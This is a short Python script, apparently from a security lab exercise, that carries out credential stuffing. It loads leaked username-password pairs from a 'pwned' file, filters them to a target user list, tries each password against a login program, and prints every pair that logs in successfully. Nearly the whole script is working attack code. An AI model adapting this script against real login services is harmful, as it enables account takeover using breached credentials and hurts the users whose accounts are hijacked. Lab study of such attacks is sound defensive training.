import time 
import subprocess

file = open("PwnedPWfile", "r")
start = time.time()

fileUser = open("gang", "r")
usernameGang = [line.strip() for line in fileUser]

PWCred = {}
for line in file:
    user, Password = line.strip().split(",")
    PWCred[user] = Password

for username in usernameGang:
    try:
        PWCred[username]
    except KeyError as e:
        continue
        
    check = subprocess.run(["python3", "Login.pyc", username, PWCred[username]], capture_output=True, text=True)

    if "Login successful." in check.stdout:
            print(f"Password found for {username}: {PWCred[username]}")
         

end = time.time()
tot  =  end - start
print(f"Time taken:{tot}")




